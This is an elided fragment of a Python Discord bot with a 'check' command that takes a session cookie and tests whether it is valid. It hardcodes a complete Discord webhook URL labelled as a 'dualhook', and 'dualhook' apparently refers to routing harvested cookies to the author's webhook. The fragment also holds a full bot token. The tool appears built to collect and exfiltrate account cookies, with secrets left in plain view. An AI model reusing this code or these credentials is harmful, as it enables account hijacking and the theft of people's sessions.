...
wh = 'https://discord.com/api/webhooks/862731994055835678/R-ZZJOfkQbQIJ2a01rOiaRq0CPXHfBzpqpPzti8BUMNVBbe-shDzdgzrG1Ld3PM-O9Sf' #enter ur dualhook here
...
async def check(ctx, cookie):
  ...
  if check.status_code ==200: #if valid..
    ...
    e.set_author(name='Bot made by ʀyder#0010')
    ...
    e.set_footer(text='.help to invite karlos to your server')
...
client.run('ODY1NTA3NDE4NjY2MDQxMzU1.YPFAmA.t2R-ELXc0Zn2vxWPY3EHDW_1ZZY') #replace with your bot token